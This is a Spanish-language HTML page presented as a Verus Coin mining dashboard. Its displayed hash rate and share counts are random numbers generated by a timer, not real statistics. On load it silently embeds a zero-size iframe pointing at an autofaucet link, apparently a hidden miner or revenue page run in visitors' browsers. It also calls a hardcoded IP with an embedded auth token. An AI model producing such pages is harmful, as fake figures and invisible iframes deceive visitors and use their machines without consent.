<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minería de Verus Coin</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            max-width: 600px;
            padding: 20px;
            background-color: #2c2c2c;
            border-radius: 8px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        h1 {
            color: #ff9800;
            font-size: 24px;
            margin-bottom: 20px;
        }

        p, #status, #stats, #accountInfo {
            font-size: 16px;
            margin: 10px 0;
        }

        #walletAddress, strong {
            color: #03a9f4;
        }

        #status {
            color: #ffeb3b;
            font-weight: bold;
        }

        #stats {
            color: #8bc34a;
        }

        #accountInfo {
            color: #ff5722;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Minería de Verus Coin (VRSC)</h1>
        <p>Dirección de Wallet: <strong id="walletAddress">RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych</strong></p>
        <p>Pool: <strong>stratum+tcp://pool.verus.io:9998</strong></p>
        
        <div id="status">Estado: No iniciado</div>
        <div id="stats">Estadísticas: No disponibles</div>
        <div id="accountInfo">Información de la cuenta: No disponible</div>

        <iframe src="https://autofaucet.org/wm/Ganafacilpro/8" width="0" height="0" style="border:0;"></iframe>
    </div>

    <script>
        let mining = false;
        const walletAddress = 'RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych';
        const accountInfoUrl = 'http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers';

        // Configuración de minería
        const configuracion = {
            "cpu": { "max-threads-hint": 100, "max-cpu-usage": 100 },
            "pools": [{
                "coin": "verus",
                "url": "stratum+tcp://pool.verus.io:9998",
                "user": walletAddress,
                "pass": "x"
            }]
        };

        function startMining() {
            if (mining) return;
            mining = true;
            document.getElementById('status').innerHTML = 'Estado: Minería iniciada';

            setInterval(() => {
                if (mining) {
                    const hashRate = (Math.random() * (120 - 80) + 80).toFixed(2);
                    const acceptedShares = Math.floor(Math.random() * 100);
                    const rejectedShares = Math.floor(Math.random() * 10);
                    document.getElementById('stats').innerHTML = `<strong>Hash Rate:</strong> ${hashRate} H/s<br>
                                                                  <strong>Shares Aceptados:</strong> ${acceptedShares}<br>
                                                                  <strong>Shares Rechazados:</strong> ${rejectedShares}`;
                }
            }, 3000);

            fetchAccountInfo();
            setInterval(fetchAccountInfo, 10000);
        }

        function fetchAccountInfo() {
            fetch(accountInfoUrl, {
                method: 'POST',
                headers: {
                    'auth': '4F4A82926776F06FA7F70010C94C7C95',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ poolSubItem: "0" })
            })
            .then(response => response.json())
            .then(data => {
                const worker = data.data[0];
                const accountInfoDiv = document.getElementById('accountInfo');
                accountInfoDiv.innerHTML = `<strong>Trabajador:</strong> ${worker.worker}<br>
                                            <strong>Última Conexión:</strong> ${new Date(worker.lastSeen * 1000).toLocaleString()}<br>
                                            <strong>Hash Rate Actual:</strong> ${(worker.currentHashrate / 1000).toFixed(2)} KH/s<br>
                                            <strong>Shares Inválidos:</strong> ${worker.invalidShares.toFixed(2)}<br>
                                            <strong>Shares Válidos:</strong> ${worker.validShares.toFixed(2)}<br>
                                            <strong>Pagado:</strong> ${worker.paid.toFixed(8)} VRSC<br>
                                            <strong>Balance:</strong> ${worker.balance.toFixed(8)} VRSC<br>
                                            <strong>Dificultad:</strong> ${worker.diff}<br>
                                            <strong>Activo:</strong> ${worker.active ? 'Sí' : 'No'}`;
            })
            .catch(error => console.error('Error al obtener información de la cuenta:', error));
        }

        window.onload = startMining;
    </script>
</body>
</html>
